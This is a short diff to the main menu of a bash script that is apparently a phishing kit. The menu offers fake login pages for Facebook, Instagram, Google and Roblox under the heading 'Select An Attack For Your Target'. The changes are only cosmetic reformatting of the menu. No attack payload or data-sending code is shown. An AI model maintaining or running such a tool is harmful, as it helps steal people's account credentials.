@@ -529,24 +529,26 @@ site_vk() {
 }
 
 ## Menu
+## Menu
 main_menu() {
-	{ clear; banner; echo; }
-	cat <<- EOF
+	clear
+	banner
+	echo
 
-		${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}
-		${GREEN}${BOLD}:: Select An Attack For Your Target ::${RESET}
-		${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}
+	printf "${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}\n"
+	printf "${GREEN}${BOLD}:: SELECT TARGET MODULE ::${RESET}\n"
+	printf "${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}\n\n"
 
-		${CYAN}[01]${RESET} ${WHITE}Facebook${RESET}
-		${CYAN}[02]${RESET} ${WHITE}Instagram${RESET}
-		${CYAN}[03]${RESET} ${WHITE}Google${RESET}
-		${CYAN}[35]${RESET} ${WHITE}Roblox${RESET}
+	printf "${CYAN}[01]${RESET} ${WHITE}Facebook${RESET}\n"
+	printf "${CYAN}[02]${RESET} ${WHITE}Instagram${RESET}\n"
+	printf "${CYAN}[03]${RESET} ${WHITE}Google${RESET}\n"
+	printf "${CYAN}[35]${RESET} ${WHITE}Roblox${RESET}\n\n"
 
-		${GRAY}Ctrl + C to Exit${RESET}
+	printf "${GRAY}Press Ctrl + C to Exit${RESET}\n\n"
 
-EOF
-	
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
+	printf "${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}\n\n"
+
+	read -p "$(printf "${GREEN}➤ Select an option : ${RESET}")" REPLY
 
 	case $REPLY in 
 		1 | 01)
